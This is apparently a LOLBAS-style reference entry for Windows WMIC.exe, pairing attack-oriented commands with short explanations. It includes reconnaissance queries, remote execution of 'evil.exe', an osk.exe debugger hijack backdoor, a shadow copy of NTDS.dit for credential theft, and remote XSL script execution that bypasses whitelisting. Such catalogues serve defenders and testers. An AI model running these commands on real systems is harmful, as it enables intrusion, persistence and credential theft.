## WMIC.exe
* Functions: Reconnaissance, Execute, Read ADS
```

wmic.exe process call create calc
Execute calc.exe.

wmic.exe process call create "c:\ads\file.txt:program.exe"
Execute a .EXE file stored as an Alternate Data Stream (ADS).

wmic.exe useraccount get /ALL
List the user accounts on the machine.

wmic.exe process get caption,executablepath,commandline
Gets the command line used to execute a running program.

wmic.exe qfe get description,installedOn /format:csv
Gets a list of installed Windows updates.

wmic.exe /node:"192.168.0.1" service where (caption like "%sql server (%")
Check to see if the target system is running SQL.

get-wmiobject –class "win32_share" –namespace "root\CIMV2" –computer "targetname"
Use the PowerShell cmdlet to list the shares on a remote server.

wmic.exe /user:<username> /password:<password> /node:<computer_name> process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.

wmic.exe /node:"192.168.0.1" process call create "evil.exe"
Execute evil.exe on the remote system.

wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
Create a scheduled execution of C:\GoogleUpdate.exe to run at 9pm.

wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
Create a volume shadow copy of NTDS.dit that can be copied.

wmic.exe process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
Execute a script contained in the target .XSL file hosted on a remote server.

wmic.exe os get /format:"MYXSLFILE.xsl"
Executes JScript or VBScript embedded in the target XSL stylesheet.

wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
Executes JScript or VBScript embedded in the target remote XSL stylsheet.
```
   
* Resources:   
  * https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory
  * https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html
  * https://twitter.com/subTee/status/986234811944648707
   
* Full path:   
  * c:\windows\system32\wbem\wmic.exe
  * c:\windows\sysWOW64\wbem\wmic.exe
   
* Notes: Thanks to Casey Smith - @subtee  
   
